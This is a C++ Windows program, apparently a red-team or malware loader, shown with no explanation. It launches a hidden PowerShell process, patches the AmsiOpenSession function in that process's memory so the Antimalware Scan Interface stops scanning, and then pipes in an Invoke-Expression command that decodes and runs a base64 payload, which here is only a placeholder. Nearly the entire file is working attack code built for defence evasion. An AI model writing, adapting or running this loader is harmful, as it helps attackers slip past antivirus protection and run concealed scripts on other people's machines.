#include <Windows.h>
#include <string>
#include <sstream>


std::string get_path(std::stringstream& path_stream) {
    std::string token;
    while (std::getline(path_stream, token, ';')) {
        if (token.find("WindowsPower") != std::string::npos) {
            return token;
        }
    }

    return "";
}


int get_length_path(const std::string& path) {
    return MultiByteToWideChar(
        CP_UTF8,
        0,
        path.c_str(),
        -1,
        nullptr,
        0
    );
}


LPWSTR string_to_LPWSTR(const std::string& path) {
    int bufferLength = get_length_path(path);
    LPWSTR wpath = new WCHAR[bufferLength];
    ZeroMemory(wpath, sizeof(WCHAR) * bufferLength);
    MultiByteToWideChar(
        CP_UTF8,
        0,
        path.c_str(),
        -1,
        wpath,
        bufferLength
    );

    return wpath;
}


char* get_env(const char* name) {
    const DWORD buffer_size = 65535;
    char* buffer = new char[buffer_size];
    if (buffer == nullptr) {
        return nullptr;
    }

    DWORD result = GetEnvironmentVariableA(name, buffer, buffer_size);
    return buffer;
}


bool patch_amsi(PROCESS_INFORMATION pi) {
    Sleep(20000);
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 
        FALSE, 
        (DWORD)pi.dwProcessId
    );

    HMODULE ams_dll = LoadLibraryW(L"amsi.dll");
    bool success = false;
    if (ams_dll != NULL) {	
		FARPROC addr = GetProcAddress(ams_dll, "AmsiOpenSession");
		int offset = 0xA;
		char* addr_ptr = reinterpret_cast<char*>(addr) + offset;
		const char new_value[] = { 0x75 };
		SIZE_T size = sizeof(new_value);
		SIZE_T bytes_written;
		if (WriteProcessMemory(
			hProcess,
			addr_ptr,
			new_value,
			size,
			&bytes_written) != 0)
		{
			success = true;
		}
     
        CloseHandle(hProcess);
        FreeLibrary(ams_dll);
    }
    
    Sleep(10000);
    return success;
}


int main()
{
    char* path = get_env("PATH");
    if (path == nullptr) {
        return EXIT_FAILURE;
    }

    std::stringstream path_stream;
    path_stream << path;
    delete[] path;
    std::string path_power = get_path(path_stream);
    if (path_power == "") {
        return EXIT_FAILURE;
    }
    
    std::string power = path_power + "\\powershell.exe";
    LPWSTR wpower_path = string_to_LPWSTR(power);	
    HANDLE hStdinRd, hStdinWr;
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;
    if (!CreatePipe(&hStdinRd, &hStdinWr, &saAttr, 0)) {
        return EXIT_FAILURE;
    }

    STARTUPINFO si;
    LPSTARTUPINFOW psi = reinterpret_cast<LPSTARTUPINFOW>(&si);
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdInput = hStdinRd;
    si.dwFlags |= STARTF_USESTDHANDLES;
    if (!CreateProcessW(
        	NULL,
        	wpower_path,
        	NULL,
        	NULL,
        	TRUE,
        	CREATE_NO_WINDOW,
        	NULL,
        	NULL,
        	psi,
        	&pi)) {
        return EXIT_FAILURE;
    }
	
    if (patch_amsi(pi)) {
		std::string command = "Invoke-Expression -Command ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>')))";
		command += ";Sleep 10;Exit\n";
		DWORD bytes_written;
		WriteFile(
                        hStdinWr,
			command.c_str(),
			static_cast<DWORD>(command.length()),
			&bytes_written,
			NULL
		);
    }
	
    CloseHandle(hStdinWr);
    CloseHandle(hStdinRd);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    delete[] wpower_path;
    return EXIT_SUCCESS;
}
